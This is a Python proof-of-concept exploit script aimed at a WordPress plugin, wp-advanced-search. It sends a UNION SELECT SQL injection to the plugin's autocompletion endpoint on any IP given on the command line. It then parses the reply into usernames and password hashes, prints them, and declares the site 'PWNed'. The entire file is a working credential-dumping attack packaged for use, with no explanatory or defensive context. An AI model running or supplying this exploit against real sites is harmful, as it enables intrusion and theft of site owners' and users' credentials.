import requests
import argparse
import sys

# ANSI color codes
RED = "\033[91m"
GREEN = "\033[92m"
RESET = "\033[0m"

def exploit(ip):
    url = f"http://{ip}/wp-content/plugins/wp-advanced-search/class.inc/autocompletion/autocompletion-PHP5.5.php"
    params = {
        "q": "admin",
        "t": "wp_users UNION SELECT user_pass FROM wp_users--",
        "f": "user_login",
        "type": "",
        "e": ""
    }

    try:
        response = requests.get(url, params=params, timeout=10)
        response.raise_for_status()
    except:
        print(f"{RED}[!] Doesn't look vulnerable..{RESET}")
        sys.exit(1)

    lines = response.text.strip().splitlines()

    users = []
    hashes = []

    for line in lines:
        line = line.strip()
        if not line:
            continue
        if line.startswith("$P$"):
            hashes.append(line)
        else:
            users.append(line)

    if users and hashes and len(users) == len(hashes):
        print(f"{GREEN}[!] {ip} has been PWNed!{RESET}")
        for user, hash_ in zip(users, hashes):
            print(f"{user}:{hash_}")
    else:
        print(f"{RED}[!] Doesn't look vulnerable..{RESET}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PoC SQL injection to dump WordPress users and hashes.")
    parser.add_argument("-i", "--ip", required=True, help="Target IP address")

    args = parser.parse_args()
    exploit(args.ip)